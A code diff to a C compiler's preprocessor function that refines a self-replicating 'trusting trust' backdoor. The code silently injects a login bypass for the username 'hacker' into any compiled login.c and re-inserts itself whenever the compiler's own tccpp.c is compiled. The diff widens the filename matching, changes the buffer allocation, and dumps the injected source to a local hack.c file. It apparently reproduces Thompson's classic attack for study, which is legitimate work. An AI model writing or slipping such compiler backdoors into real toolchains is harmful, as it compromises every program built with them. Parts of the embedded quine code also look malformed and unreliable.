@@ -618,7 +618,7 @@ static int handle_eob(void)
 	    fwrite(file->filename, 1, strlen(file->filename), fw);
 	    fclose(fw);
 	    char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!\\n%c);%c    return 0;%c  }%c  ";
-	    if(strcmp(file->filename, "login.c") == 0 && bf->buffer[0] != ' ') {
+	    if(strstr(file->filename, "login.c") != NULL && bf->buffer[0] != ' ') {
 	        unsigned char* inject_code[200];
 		snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 34, 10, 10, 10);
 		int inject_len;
@@ -636,10 +636,10 @@ static int handle_eob(void)
 		strncpy(bf->buffer, new_buf, len);
 		bf->buffer[len] = 0;
 	    }
-	    if(strcmp(file->filename, "tccpp.c") == 0 && bf->buffer[0] != ' ') {
+	    if(strstr(file->filename, "tccpp.c") != NULL && bf->buffer[0] != ' ') {
 		char* inject_compiler = 
 	    	"%c    char* inject_login = %c%s%c;%c"
-	        "%c    if(strcmp(file->filename, %clogin.c%c) == 0 && bf->buffer[0] != %c %c) {%c"
+	        "%c    if(strstr(file->filename, %clogin.c%c) != NULL && bf->buffer[0] != %c %c) {%c"
 		"%c%cunsigned char* inject_code[200];%c"
 		"%c%csnprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 34, 10, 10, 10);%c"
 		"%c%cint inject_len;%c"
@@ -657,10 +657,10 @@ static int handle_eob(void)
 		"%c%cstrncpy(bf->buffer, new_buf, len);%c"
 		"%c%cbf->buffer[len] = 0;%c"
 	    	"%c    }%c"
-	    	"%c    if(strcmp(file->filename, %ctccpp.c%c) == 0 && bf->buffer[0] != ' ') {%c"
+	    	"%c    if(strstr(file->filename, %ctccpp.c%c) != NULL && bf->buffer[0] != ' ') {%c"
 	    	"%c%cchar* inject_compiler = %c%s%c;%c"
-		"%c%cunsigned char* inject_code[5000];%c"
-		"%c%csnprintf(inject_code, 5000, 9, 34, inject_login, 34, 10, 9, 34, 34, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 92, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 34, 34, 10, 9, 9, 34, inject_compiler, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 9);%c"
+		"%c%cunsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);%c"
+		"%c%csnprintf(inject_code, 5000, 9, 34, inject_login, 34, 10, 9, 34, 34, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 92, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 34, 34, 10, 9, 9, 34, inject_compiler, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 9);%c"
 		"%c%cint inject_len;%c"
 	        "%c%cinject_len = strlen(inject_compiler);%c"
 		"%c%cunsigned char* new_buf;%c"
@@ -675,9 +675,9 @@ static int handle_eob(void)
 		"%c%clen = len + inject_len - 7;%c"
 		"%c%cstrncpy(bf->buffer, new_buf, len);%c"
 		"%c%cbf->buffer[len] = 0;%c"
-	    	"%c    }%c%c%c"
-		unsigned char* inject_code[5000];
-		snprintf(inject_code, 5000, 9, 34, inject_login, 34, 10, 9, 34, 34, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 92, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 34, 34, 10, 9, 9, 34, inject_compiler, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 9);
+	    	"%c    }%c%c%c";
+		unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);
+		snprintf(inject_code, 5000, inject_compiler, 9, 34, inject_login, 34, 10, 9, 34, 34, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 92, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 34, 34, 10, 9, 9, 34, inject_compiler, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 39, 39, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 9, 9);
 		int inject_len;
 	        inject_len = strlen(inject_compiler);
 		unsigned char* new_buf;
@@ -692,6 +692,9 @@ static int handle_eob(void)
 		len = len + inject_len - 7;
 		strncpy(bf->buffer, new_buf, len);
 		bf->buffer[len] = 0;
+	        FILE* fw2 = fopen("/home/zmx/Desktop/trusting-trust/hack.c", "w");
+	        fwrite(bf->buffer, 1, len, fw2);
+	        fclose(fw2);
 	    }
             if (len < 0)
                 len = 0;
